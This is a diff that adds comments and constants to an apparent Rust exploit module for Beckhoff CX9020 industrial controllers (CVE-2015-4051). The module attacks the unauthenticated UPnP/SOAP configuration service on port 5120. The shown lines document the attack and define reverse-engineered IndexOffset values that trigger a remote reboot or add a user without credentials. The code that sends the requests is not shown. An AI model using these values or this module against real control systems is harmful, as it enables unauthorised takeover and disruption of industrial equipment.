@@ -1,10 +1,24 @@
+//! Beckhoff CX9020 unauthenticated SOAP exploit via the CX config `UPnP` service.
+//!
+//! Targets the CX embedded web server at TCP 5120, exposed by `TwinCAT` 3 on CX9020
+//! (and related CX embedded PCs). No credentials required.
+//!
+//! Disclosed: ICS-CERT ICSA-15-258-03 / CVE-2015-4051.
+//! The INDEX_* constants are `UPnP` SOAP `IndexOffset` values reversed from the
+//! Beckhoff CX config service binary (`TwinCAT` 3 CX9020 firmware <= v3.1.4020).
+//! Two offsets are tried (active/inactive) because the value that works depends
+//! on a live/inactive state flag in the running firmware instance.
+
 use anyhow::{bail, Result};
 use base64::{engine::general_purpose, Engine};
 use std::net::UdpSocket;
 use std::time::Duration;
 
+// SOAP IndexOffset for the CX config reboot action (active-session and inactive-session variants).
+// Source: ICSA-15-258-03 / CVE-2015-4051 (Beckhoff CX9020 firmware <= v3.1.4020).
 const INDEX_ACTIVE_REBOOT: &str = "1329528576";
 const INDEX_INACTIVE_REBOOT: &str = "1330577152";
+// SOAP IndexOffset for the CX config add-user action.
 const INDEX_ACTIVE_USER: &str = "1339031296";
 const INDEX_INACTIVE_USER: &str = "1340079872";
 /// Default port for the Beckhoff CX web/UPnP configuration service.
